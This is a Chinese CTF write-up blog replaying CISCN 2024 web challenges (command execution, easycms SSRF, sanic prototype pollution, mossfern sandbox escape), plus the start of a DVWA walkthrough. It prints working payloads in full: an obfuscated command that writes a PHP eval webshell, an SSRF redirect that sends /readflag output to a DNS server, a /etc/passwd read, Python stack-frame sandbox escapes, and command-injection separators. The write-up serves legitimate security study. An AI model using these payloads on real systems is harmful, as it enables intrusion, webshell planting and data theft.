<h2 id="首先是用第一种绕法来写"><a href="#首先是用第一种绕法来写" class="headerlink" title="首先是用第一种绕法来写"></a>首先是用第一种绕法来写</h2><p><code>php -r $a=hex2bin(substr(_6C73,1,100));system($a);</code><br>首先由于我们无法输入如ls等系统命令，所有我们可以尝试使用数字函数来进行任意字符的构造，而再2019年的CISCN上出过一道利用数字函数来命令执行的题目叫<a href="https://lisien11.github.io/2024/03/18/NSSCTF%E5%88%B7%E9%A2%981(%E5%86%85%E6%9C%89%E6%97%A0%E5%AD%97%E7%AC%A6%E6%95%B0%E5%AD%97RCE">love math</a>/)<br>但是这题将ch个禁了导致我们无法使用dechex函数。而如果直接使用hex2bin函数来将16进制数字进行转换则会报错，于是我们使用了substr来强制将16进制改为字符串。使得hex2bin函数能正常返回转换后的值，<br>而后将变量<code>$a</code>变为system的参数来命令执行。<br>我们只要利用bin2hex来将字符串转换成16进制字符即可。<br>接下来我们可以进行写马操作来方便我们执行命令。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c</span>=<span class="string">&quot;printf &#x27;&lt;?php eval(\$_POST[1]);phpinfo();?&gt;&#x27; &gt; 1.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure><br>这道题目mysql的数据库账号密码为root root。<br>我们直接使用mysql -u root -p’root’ -e ‘SHOW DATABASES;’来查找数据库名<br>最后可以再F1ag_Se3Re7 表下找到flag<br><img src="/2024/05/20/CISCN2024%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/2.png" class="" title="alt text"></p>
<h2 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h2><p>这个方法是我在赛后看其他师傅的wp看到的，直接利用eval函数来进行命令执行<br>由于liunx中eval函数是将字符串当成命令来执行，即<code>eval l\\s</code>其实是相当于在终端中执行了<code>l\s</code>而在bash中会直接忽略这个反斜杠。即执行了ls。而我们在传入<code>eval l\s</code>经过escapeshellcmd()函数处理为<code>eval l\\s</code>这样waf是检测不到ls的但是可以命令执行。<br>那么我们执行使用如下命令就可以进行写马操作<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval printf c\HJpbnRmI\C\c8P3Boc\CBldmFsKCRfUE9TVFsxXSk7cGhwaW5mbygpOz8%2BJyA%2BI\DIucGhw|base\64 -d|s\h</span><br></pre></td></tr></table></figure></p>
<h1 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h1><p>审0day。。。<br><img src="/2024/05/20/CISCN2024%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/7.png" class="" title="alt text"><br>这个cms可以通过如上方法来访问我们想访问的function。<br><img src="/2024/05/20/CISCN2024%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/6.png" class="" title="alt text"><br>我们在API api.php文件下发现了qrcode这个方法，而这个方法里存在了一个函数dr_catcher_data<br><img src="/2024/05/20/CISCN2024%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/4.png" class="" title="alt text"><br><code>$ch = curl_init($url);</code><br>这个函数使用了curl_exce函数来访问而url就是我们输入的<br><img src="/2024/05/20/CISCN2024%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/9.png" class="" title="alt text"><br>而url就是变量<code>$thumb</code>的值而这个值我们是可控的.<br>那么这里就是ssrf的漏洞点,但是这个参数不能直接设定为127.0.0.1来进行访问,需要我们搭建一个302重定向的网页,使其重定向到127.0.0.1\flag.php?cmd=~<br>以此来进行命令执行.<br>搭建源码如下<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location: 127.0.0.1/flag.php?cmd=curl+`/readflag`.DNS服务器&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>之后使用<br><img src="/2024/05/20/CISCN2024%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/10.png" class="" title="alt text"><br>来触发.</p>
<h1 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h1><p>和上一题相比加了一个waf,来检测图片我们只要在网页输出一个图片内容即可<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location: 127.0.0.1/flag.php?cmd=curl+`/readflag`.DNS服务器&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;1.png&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="sanic"><a href="#sanic" class="headerlink" title="sanic"></a>sanic</h1><p>这道题目是一个原型链污染,说实话在打比赛的时候有简单审计一下这个代码感觉是原型链污染,但是前面的检测waf绕不过也就不了了之了。<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>首先需要绕过这个检测，我们都知道在http报文中<code>;</code>是拿来分隔不同的cookie的，这也就导致我们无法直接给user传入adm;n，在赛后我看了一下其他师傅的文章，发现可以使用八进制来绕过<br><code>admin=&quot;adm\073n&quot;;</code><br>绕过后就可以使用admin路由了<br>我们可以很明显的发现一个函数<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">async def <span class="title function_ invoke__">admin</span>(request):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;admin&#x27;</span>) == True:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="title function_ invoke__">type</span>(key) is str <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> not in key:</span><br><span class="line">            pollute = <span class="title function_ invoke__">Pollute</span>()</span><br><span class="line">            pydash.<span class="title function_ invoke__">set_</span>(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">text</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">text</span>(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">text</span>(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>我们可以看到这个pydash.set<em>(pollute, key, value)，其直接使用pydash.set</em>来讲key作为键value作为内容在设定pollute这个对象。而这个key和value是我们可控的，这就导致了原型链污染。我们可以使用如下参数作为key<br><code>__init__.__globals__.__file__</code>这样就可以污染到<code>__file__</code>，而src这个路由直接输出了<strong>file</strong>的文件内容，这就会造成任意文件读取。<br>而这道题还加了个waf。其会检测<strong>.我看复现的wp是通过审计pydash.set_来发现可以通过<code>\\\\</code>来绕过,即`{“key”:”</strong>init<strong>\\.</strong>globals<strong>\\.</strong>file<strong>“,”value”:”/etc/passwd”}<code>可以将</code></strong>file__`污染为/etc/passwd。<br>在复现的环境下直接读取/proc/self/environ发现并没有flag。尝试了几次发现flag大概率需要rce才能拿到flag,网上的wp太少了，没几篇写了这题，所有先空着等wp多了在继续复现</p>
<h1 id="mossfern"><a href="#mossfern" class="headerlink" title="mossfern"></a>mossfern</h1><p>这题使用的是栈帧逃逸<br><a href="https://zer0peach.github.io/2024/04/29/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#L3HCTF2024">python利用栈帧进行沙箱逃逸
</a><br><a href="https://xz.aliyun.com/t/13635?time__1311=mqmxnQ0QiQi%3DDteDsD7md0%3DdG%3Dmy7Lh727TD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-1">Python利用栈帧逃逸</a><br>因为其将<strong>给禁了导致我们无法使用常规方法来进行逃逸<br>栈帧逃逸主要使用的几个方法f_code( 返回一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。)，f_back(返回上一栈帧，主要用于逃逸)，f_globals(用于获取全局变量)<br>我们先尝试传入<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">gen = my_generator()</span><br><span class="line">frame = gen.gi_frame</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Local Variables:&quot;</span>, frame.f_locals)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Global Variables:&quot;</span>, frame.f_globals)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Code Object:&quot;</span>, frame.f_code)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Instruction Pointer:&quot;</span>, frame.f_lasti)</span><br></pre></td></tr></table></figure><br>回显<br><img src="/2024/05/20/CISCN2024%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/11.png" class="" title="alt text"><br>会发现其没有过滤,可以使用栈帧<br>我们传入<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    g = f()  </span><br><span class="line">    frame = <span class="built_in">next</span>(g) </span><br><span class="line">    <span class="built_in">globals</span>=frame.f_back</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">globals</span>)</span><br><span class="line">waff()</span><br></pre></td></tr></table></figure><br>来尝试使用f_back进行逃逸发现其回显{“result”:”LOAD_GLOBAL\n\n”}<br>应该是进行了过滤,但是我们还可以使用另一个生成器<code>frame = [x for x in g][0]</code>来得到器栈帧对象<br>之后使用f_back和f_globals来得到全局变量`</strong>globals<strong><code><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">    g = f()  </span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>] </span><br><span class="line">    <span class="built_in">globals</span>=frame.f_back.f_back.f_back.f_globals</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">globals</span>)</span><br><span class="line">waff()</span><br></pre></td></tr></table></figure>
但back输出脚本文件名时即为成功逃逸。
得到globals后我们就可以得到</code></strong>builtins<strong><code>而</code></strong>builtins<strong><code>含有一些内置函数。如下</code>‘ArithmeticError’, ‘AssertionError’, ‘AttributeError’, ‘BaseException’, ‘BaseExceptionGroup’, ‘BlockingIOError’, ‘BrokenPipeError’, ‘BufferError’, ‘BytesWarning’, ‘ChildProcessError’, ‘ConnectionAbortedError’, ‘ConnectionError’, ‘ConnectionRefusedError’, ‘ConnectionResetError’, ‘DeprecationWarning’, ‘EOFError’, ‘Ellipsis’, ‘EncodingWarning’, ‘EnvironmentError’, ‘Exception’, ‘ExceptionGroup’, ‘False’, ‘FileExistsError’, ‘FileNotFoundError’, ‘FloatingPointError’, ‘FutureWarning’, ‘GeneratorExit’, ‘IOError’, ‘ImportError’, ‘ImportWarning’, ‘IndentationError’, ‘IndexError’, ‘InterruptedError’, ‘IsADirectoryError’, ‘KeyError’, ‘KeyboardInterrupt’, ‘LookupError’, ‘MemoryError’, ‘ModuleNotFoundError’, ‘NameError’, ‘None’, ‘NotADirectoryError’, ‘NotImplemented’, ‘NotImplementedError’, ‘OSError’, ‘OverflowError’, ‘PendingDeprecationWarning’, ‘PermissionError’, ‘ProcessLookupError’, ‘RecursionError’, ‘ReferenceError’, ‘ResourceWarning’, ‘RuntimeError’, ‘RuntimeWarning’, ‘StopAsyncIteration’, ‘StopIteration’, ‘SyntaxError’, ‘SyntaxWarning’, ‘SystemError’, ‘SystemExit’, ‘TabError’, ‘TimeoutError’, ‘True’, ‘TypeError’, ‘UnboundLocalError’, ‘UnicodeDecodeError’, ‘UnicodeEncodeError’, ‘UnicodeError’, ‘UnicodeTranslateError’, ‘UnicodeWarning’, ‘UserWarning’, ‘ValueError’, ‘Warning’, ‘ZeroDivisionError’, ‘_’, ‘</strong>build<em>class<strong>‘, ‘</strong>debug<strong>‘, ‘</strong>doc<strong>‘, ‘</strong>import<strong>‘, ‘</strong>loader<strong>‘, ‘</strong>name<strong>‘, ‘</strong>package<strong>‘, ‘</strong>spec<strong>‘, ‘abs’, ‘aiter’, ‘all’, ‘anext’, ‘any’, ‘ascii’, ‘bin’, ‘bool’, ‘breakpoint’, ‘bytearray’, ‘bytes’, ‘callable’, ‘chr’, ‘classmethod’, ‘compile’, ‘complex’, ‘copyright’, ‘credits’, ‘delattr’, ‘dict’, ‘dir’, ‘divmod’, ‘enumerate’, ‘eval’, ‘exec’, ‘exit’, ‘filter’, ‘float’, ‘format’, ‘frozenset’, ‘getattr’, ‘globals’, ‘hasattr’, ‘hash’, ‘help’, ‘hex’, ‘id’, ‘input’, ‘int’, ‘isinstance’, ‘issubclass’, ‘iter’, ‘len’, ‘license’, ‘list’, ‘locals’, ‘map’, ‘max’, ‘memoryview’, ‘min’, ‘next’, ‘object’, ‘oct’, ‘open’, ‘ord’, ‘pow’, ‘print’, ‘property’, ‘quit’, ‘range’, ‘repr’, ‘reversed’, ‘round’, ‘set’, ‘setattr’, ‘slice’, ‘sorted’, ‘staticmethod’, ‘str’, ‘sum’, ‘super’, ‘tuple’, ‘type’, ‘vars’, ‘zip’<code>首先我们要得到dir这个函数可以查看一个对象包含的方法属性变量等
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">    g = f()  </span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>] </span><br><span class="line">    <span class="built_in">globals</span>=frame.f_back.f_back.f_back.f_globals</span><br><span class="line">    builtins=<span class="built_in">globals</span>[<span class="string">&quot;_&quot;</span><span class="string">&quot;_builtins_&quot;</span><span class="string">&quot;_&quot;</span>]</span><br><span class="line">    <span class="built_in">dir</span>=builtins.<span class="built_in">dir</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">dir</span>(<span class="built_in">globals</span>))</span><br></pre></td></tr></table></figure>
如上我们可以得到全局变量的使用方法属性等，如果其有包含eval等函数可以直接使用，但是这题是没有的
我在复现的时候有尝试通过</code></strong>builtins<strong><code>来获取eval之后尝试命令执行但不知道为什么无法执行
代码如下
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">    g = f()  </span><br><span class="line">    <span class="comment">#frame = next(g) </span></span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>] </span><br><span class="line">    <span class="built_in">globals</span>=frame.f_back.f_back.f_back.f_globals</span><br><span class="line">    builtins=<span class="built_in">globals</span>[<span class="string">&quot;_&quot;</span><span class="string">&quot;_builtins_&quot;</span><span class="string">&quot;_&quot;</span>]</span><br><span class="line">    <span class="built_in">dir</span>=builtins.<span class="built_in">dir</span></span><br><span class="line">    <span class="built_in">eval</span>=builtins.<span class="built_in">eval</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">eval</span>(<span class="string">&quot;_&quot;</span><span class="string">&quot;_import_&quot;</span><span class="string">&quot;_(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>))</span><br><span class="line">waff()</span><br></pre></td></tr></table></figure>
命令执行并不回显而且ping dnslog服务器也无法ping通。
所有放弃这个方法
但是我们看源码会发现其存在一个操作
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(</span><br><span class="line">            runner.replace(<span class="string">&quot;THIS_IS_SEED&quot;</span>, flag).replace(<span class="string">&quot;THIS_IS_TASK_RANDOM_ID&quot;</span>, <span class="built_in">id</span>))</span><br></pre></td></tr></table></figure>
其将flag变量之间替换runner文件的THIS_IS_SEED，这就导致了flag的值变成了常量，可以通过输出co_consts来得到flag的值。
co_consts使用一个存储了全局所有出现的字面常量的值。
&#123;% asset_img "12.png" "alt text" %&#125;
那么我们只要输出co_consts就可以得到flag
我们使用f_code来得到代码对象，在通过代码对象来得到co_consts
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    g = f()  </span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>] </span><br><span class="line">    <span class="built_in">globals</span>=frame.f_back.f_back.f_back.f_globals</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">globals</span>)</span><br><span class="line">    builtins=<span class="built_in">globals</span>[<span class="string">&quot;_&quot;</span><span class="string">&quot;_builtins_&quot;</span><span class="string">&quot;_&quot;</span>]</span><br><span class="line">    <span class="built_in">dir</span>=builtins.<span class="built_in">dir</span></span><br><span class="line">    flag=frame.f_back.f_back.f_back.f_code</span><br><span class="line">    <span class="built_in">print</span>(flag.co_consts)</span><br><span class="line">waff()</span><br></pre></td></tr></table></figure>
但是由于程序对输出有一个判断
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;THIS_IS_SEED&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！&quot;</span>)</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;bad code-operation why still happened ah?&quot;</span>)</span><br></pre></td></tr></table></figure>
由于我们输出的是全局的常数所以会输出THIS_IS_SEED导致无法通过检测。
我们需要做进一步处理
通过</code></strong>builtins_</em>`下的str来将flag.co_consts强制转换为字符串，然后一个字符一个字符输出，字符之间以空格分割代码如下<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    g = f()  </span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>] </span><br><span class="line">    <span class="built_in">globals</span>=frame.f_back.f_back.f_back.f_globals</span><br><span class="line">    builtins=<span class="built_in">globals</span>[<span class="string">&quot;_&quot;</span><span class="string">&quot;_builtins_&quot;</span><span class="string">&quot;_&quot;</span>]</span><br><span class="line">    flag=frame.f_back.f_back.f_back.f_code.co_consts</span><br><span class="line">    <span class="built_in">str</span>=builtins.<span class="built_in">str</span></span><br><span class="line">    flag=<span class="built_in">str</span>(flag)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(i,end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">waff()</span><br></pre></td></tr></table></figure><br>得到flag<br><img src="/2024/05/20/CISCN2024%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/15.png" class="" title="alt text"></p>
]]></content>
      <categories>
        <category>wp</category>
        <category>比赛wp(复现)</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA的wp</title>
    <url>/2024/01/01/DVWA%E7%9A%84wp/</url>
    <content><![CDATA[<h1 id="Burte-Force"><a href="#Burte-Force" class="headerlink" title="Burte Force"></a>Burte Force</h1><p>这一关考察我们是爆破。</p>
<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><img src="/2024/01/01/DVWA%E7%9A%84wp/1-1.png" class="" title="Alt text">
<p>这一串代码对与刷过sqli-labs的来说应该是比较熟悉的。<br>我们审查代码可以看出来，这个代码没有对我们输入的username做任何过滤，只将password编码为md5，那么我们就有两种解法，一个是使用sql注入直接使用万能密码，第二个是使用bp来爆破了。</p>
<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>这关我们查看源码<br><img src="/2024/01/01/DVWA%E7%9A%84wp/1-2.png" class="" title="Alt text"><br><code>mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user )</code><br>我们发现多了这个函数，这个函数对于刷过sqlilabs的我们来说应该不陌生，这个函数的作用是给字符串里存在的特殊字符前加一个\对字符进行转义以此来防止注入。如果该数据库的字符集为gbk编码的话可以使用%df来进行绕过\但是这关不是<br>那么这关就无法进行注入了。而且我们在查看一下代码可以发现只要登陆失败就会激活sleep(2)函数导致爆破速度变慢，但是我们仍然可以进行爆破</p>
<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><h3 id="token"><a href="#token" class="headerlink" title="token"></a>token</h3><p>token是防止重复登陆爆破的一种方式，token是由服务端随机生成，发送到客户端，将其保存在客户端的cookie或者session里，在用户登陆时将其一同在表单里发送，当表单发送到服务端时服务器会刷新token并再发送到用户端。这也就导致我们直接使用bp来进行简单的爆破就会导致再发送第二次的时候由于发送的token与服务端不同导致无法成功。这使用我们需要更改一些设置使其可以将上一次服务器发送的响应来获取token进行爆破<br><img src="/2024/01/01/DVWA%E7%9A%84wp/3.png" class="" title="Alt text"><br>我们将token也添加为有效载荷<br><img src="/2024/01/01/DVWA%E7%9A%84wp/4.png" class="" title="Alt text"><br>在将攻击线程调整为1因为在发送后服务的就会刷新token所以无法进行多线程爆破<br><img src="/2024/01/01/DVWA%E7%9A%84wp/5.png" class="" title="Alt text"><br><img src="/2024/01/01/DVWA%E7%9A%84wp/6.png" class="" title="Alt text"><br>我们将重定向条件为总是，再添加检索提取，点击重新获取响应，找到token的内容右键选择再点击确定，<img src="/2024/01/01/DVWA%E7%9A%84wp/2.png" class="" title="Alt text"><br>之后这种token选择递归提取，将刚才的token复制到初始payload里就可以开始爆破了</p>
<h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><p>这一关由于输入了三次错误以上就会锁定导致爆破的时间大大增加所以比较安全</p>
<h1 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h1><h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2><p>这个我们查看源码可以发现其含有一个函数shell_exec这个函数会将参数当成指令运行，而且由于该函数没有对每个字符和指令过滤导致我们可以直接在输入的ip后使用连接符连接一个指令导致服务器端信息泄露<br>下面是一些命令拼接符号<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A;B A运行成功与失败都会运行B</span><br><span class="line">A|B 将A运行的结果当作B的参数运行</span><br><span class="line">A&amp;B A在后台运行AB同时运行</span><br><span class="line">A&amp;&amp;B A成功运行B</span><br><span class="line">A||B A失败运行B</span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1|dir</span><br></pre></td></tr></table></figure></p>
